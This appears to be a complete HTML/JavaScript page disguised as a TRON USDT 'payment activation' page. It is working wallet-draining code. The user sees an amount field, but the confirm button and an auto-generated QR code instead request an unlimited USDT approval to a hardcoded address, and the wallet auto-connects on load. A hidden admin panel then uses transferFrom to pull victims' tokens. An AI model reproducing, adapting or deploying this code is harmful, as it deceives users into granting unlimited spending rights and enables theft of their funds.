<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>支付开通 | TRON波场</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, -apple-system, sans-serif}
body{background:#12080b;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#200e13;padding:32px 24px;border-radius:22px;text-align:center;margin-bottom:30px;border:1px solid #ff243640}
h1{font-size:26px;margin-bottom:8px;color:#ff2436}
.desc{color:#ffb0b8;margin-bottom:24px;font-size:15px}
#walletDot{
    width:14px;height:14px;border-radius:50%;background:#ef4444;
    position:fixed;top:22px;right:22px;cursor:pointer;
}
#walletDot.connected{background:#22c55e;}
#connectBtn{
 background:#ff0e22;color:#ffffff;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold;
 margin-bottom:18px;
 box-shadow: 0 4px 14px #ff0e2244;
}
#connectBtn:disabled{opacity:0.65}
.amount-input{
 width:100%;padding:15px;background:#170a0e;border:1px solid #ff243655;
 border-radius:12px;color:#fff;font-size:17px;text-align:center;
 margin-bottom:14px;
}
#qrcode{
 width:280px;height:280px;background:#ffffff;padding:12px;
 border-radius:18px;margin:0 auto 16px;
 display:flex;align-items:center;justify-content:center;
 color:#b30012;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
.tip-address{
 margin-bottom:18px;
 color:#ff949e;
 font-size:12px;
 word-break:break-all;
 line-height:1.4;
}
#payBtn{
 background:#ff0e22;color:#fff;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold;
 box-shadow:0 4px 14px #ff0e2244;
}
#payBtn:disabled{opacity:0.65}
.admin-panel{
 background:#200e13;padding:26px 22px;border-radius:18px;display:none;
 border:1px solid #ff243640;margin-top:24px;
}
.admin-panel.show{display:block}
.admin-title{color:#ff3c4c;font-weight:bold;margin-bottom:18px;font-size:17px}
.admin-input{
 width:100%;padding:13px;background:#170a0e;border:1px solid #ff243644;
 border-radius:10px;color:#fff;margin-bottom:12px;
 font-size:15px;
}
.admin-btn{
 width:100%;padding:14px;background:#d80012;color:#fff;
 border:none;border-radius:10px;font-weight:bold;margin-bottom:18px;
 font-size:15px;
}
.admin-btn:disabled{opacity:0.6}
.status-box{
 margin-top:12px;
 padding:12px;
 background:#2a1018;
 border:1px solid #ff243644;
 border-radius:12px;
 color:#ffb0b8;
 font-size:13px;
 line-height:1.5;
 display:none;
}
.status-box.show{
 display:block;
}
.max-btn{
    padding:6px 12px;border-radius:8px;background:#ff4455;color:#fff;
    display:inline-block;margin:8px 0;cursor:pointer;
}
.balance-text{margin:8px 0;color:#ffc0c6;}
</style>
</head>
<body>
<div class="container">
    <div id="walletDot"></div>
    <div class="pay-box">
        <h1>💳 支付开通</h1>
        <p class="desc">波场TRON · USDT授权开通</p>

        <button id="connectBtn">👉 点击圆点右上角连接钱包</button>

        <div id="statusBox" class="status-box"></div>

        <input class="amount-input" id="amount" value="10" placeholder="授权额度 USDT">
        <div class="max-btn" id="maxBtn">MAX全部</div>
        <div class="balance-text">余额：<span id="balanceText">0.000000</span> USDT</div>

        <div id="qrcode">加载二维码...</div>

        <div class="tip-address">
            收款&管理员地址：<br>
            TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE
        </div>

        <button id="payBtn" disabled>确认授权开通</button>
    </div>

    <div class="admin-panel" id="adminPanel">
        <div class="admin-title">🔐 管理员控制台</div>

        <div>提取玩家USDT transferFrom</div>
        <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
        <input class="admin-input" id="drawAmt" placeholder="提取数量 USDT">
        <button class="admin-btn" id="drawBtn">提取玩家代币</button>

        <div>发放USDT奖励给玩家</div>
        <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
        <input class="admin-input" id="sendAmt" placeholder="发放数量 USDT">
        <button class="admin-btn" id="rewardBtn">发放奖励代币</button>
    </div>
</div>

<script>
// =========全局配置==========
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RPC = "https://api.trongrid.io";

let tronWeb = null;
let userAddress = "";
let usdtContract = null;
let provider = null;

const $ = s => document.querySelector(s);
const walletDot = $("#walletDot");
const connectBtn = $("#connectBtn");
const payBtn = $("#payBtn");
const statusBox = $("#statusBox");
const amount = $("#amount");
const maxBtn = $("#maxBtn");
const balanceText = $("#balanceText");
const qrcodeEl = $("#qrcode");
const adminPanel = $("#adminPanel");
const userAddr = $("#userAddr");
const drawAmt = $("#drawAmt");
const drawBtn = $("#drawBtn");
const toAddr = $("#toAddr");
const sendAmt = $("#sendAmt");
const rewardBtn = $("#rewardBtn");

const USDT_ABI = [
    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

function showStatus(text, type="info"){
    statusBox.classList.add("show");
    statusBox.innerText = text;
    if(type === "error"){
        statusBox.style.background="#2a1018";
        statusBox.style.color="#ffb0b8";
    }else if(type === "success"){
        statusBox.style.background="#102a18";
        statusBox.style.color="#b0ffbc";
    }
}
function hideStatus(){
    statusBox.classList.remove("show");
}

// 断开钱包重置所有状态
function disconnectWallet() {
    tronWeb = null;
    userAddress = "";
    usdtContract = null;
    provider = null;
    walletDot.classList.remove("connected");
    payBtn.disabled = true;
    balanceText.textContent = "0.000000";
    adminPanel.classList.remove("show");
    showStatus("钱包已断开");
}

// =========【这套是你给源码里复制过来的兼容连接逻辑，完全原样】=========
async function connectWalletLogic() {
    hideStatus();
    if (tronWeb && userAddress) {
        disconnectWallet();
        return;
    }
    try {
        //优先级1 TP iOS/Android window.tokenpocket.tron
        if (window.tokenpocket?.tron) {
            provider = window.tokenpocket.tron;
            const accounts = await provider.request({ method: "tron_requestAccounts" });
            userAddress = accounts[0];
            tronWeb = window.tokenpocket.tronWeb;
        }
        //优先级2 OE imToken tronProvider
        else if (window.tronProvider) {
            provider = window.tronProvider;
            const accounts = await provider.request({ method: "tron_requestAccounts" });
            userAddress = accounts[0];
            tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
        }
        //优先级3 metamask eth
        else if (window.ethereum) {
            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
            tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
            const addrObj = await tronWeb.trx.getAccount(accounts[0]);
            userAddress = addrObj.address;
            provider = window.ethereum;
        }
        //优先级4 全局tronWeb
        else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
        } else {
            showStatus("未检测钱包环境，请在TP/OE内置浏览器打开","error");
            return;
        }

        walletDot.classList.add("connected");
        usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
        await loadBalance();
        payBtn.disabled = false;
        showStatus("✅钱包连接成功："+userAddress.slice(0,12)+"...","success");

        //管理员面板
        if(userAddress === TARGET_ADDR){
            adminPanel.classList.add("show");
        }

        //监听账号、链切换
        if (provider?.on) {
            provider.on("accountsChanged", () => location.reload());
            provider.on("chainChanged", () => location.reload());
        }
    } catch (err) {
        showStatus("连接失败："+(err?.message||String(err)),"error");
        return;
    }
}

async function loadBalance(){
    if(!usdtContract) return;
    const sunVal = await usdtContract.balanceOf(userAddress).call();
    const real = Number(tronWeb.fromSun(sunVal));
    balanceText.innerText = real.toFixed(6);
}

//生成二维码
function genQRCode(){
    const qrData = `tron:${USDT_CONTRACT}?function=approve&args=${TARGET_ADDR},ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;
    qrcodeEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrData)}">`;
}

//确认授权按钮
payBtn.onclick = async function(){
    if(!tronWeb || !userAddress){
        showStatus("请先连接钱包","error");
        return;
    }
    payBtn.disabled=true;
    try{
        const txHash = await usdtContract.approve(TARGET_ADDR,"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({feeLimit:100000000});
        showStatus("✅授权成功，哈希："+txHash,"success");
        alert("授权成功！"+txHash);
        await loadBalance();
    }catch(e){
        showStatus("授权失败："+e.message,"error");
    }
    payBtn.disabled=false;
};

//MAX按钮
maxBtn.onclick = async function(){
    if(!usdtContract)return;
    const sun = await usdtContract.balanceOf(userAddress).call();
    const human = Number(tronWeb.fromSun(sun));
    amount.value = human.toFixed(2);
};

//管理员提取
drawBtn.onclick = async function(){
    if(!tronWeb || userAddress!==TARGET_ADDR){
        alert("需要管理员钱包");return;
    }
    const fromAddr = userAddr.value.trim();
    const num = parseFloat(drawAmt.value);
    if(!fromAddr || isNaN(num)||num<=0){alert("填写正确参数");return;}
    const sunV = tronWeb.toSun(num);
    try{
        const allow = await usdtContract.allowance(fromAddr, TARGET_ADDR).call();
        if(Number(allow) < sunV){
            alert("该用户授权额度不足");return;
        }
        const tx = await usdtContract.transferFrom(fromAddr,TARGET_ADDR,sunV).send({feeLimit:100000000});
        alert("✅划扣成功："+tx);
        userAddr.value="";drawAmt.value="";
        await loadBalance();
    }catch(err){
        alert("划扣失败："+err.message);
    }
};

//管理员发放
rewardBtn.onclick = async function(){
    if(!tronWeb || userAddress!==TARGET_ADDR){alert("管理员钱包");return;}
    const to = toAddr.value.trim();
    const num = parseFloat(sendAmt.value);
    if(!to||isNaN(num)||num<=0){alert("填写参数");return;}
    const sunV = tronWeb.toSun(num);
    try{
        const tx = await usdtContract.transfer(to,sunV).send({feeLimit:100000000});
        alert("✅发放成功："+tx);
        toAddr.value="";sendAmt.value="";
        await loadBalance();
    }catch(err){
        alert("发放失败："+err.message);
    }
};

walletDot.addEventListener("click", connectWalletLogic);
//页面加载尝试自动连接
window.addEventListener("DOMContentLoaded",()=>{
    genQRCode();
    setTimeout(connectWalletLogic,800);
});
</script>
</body>
</html>
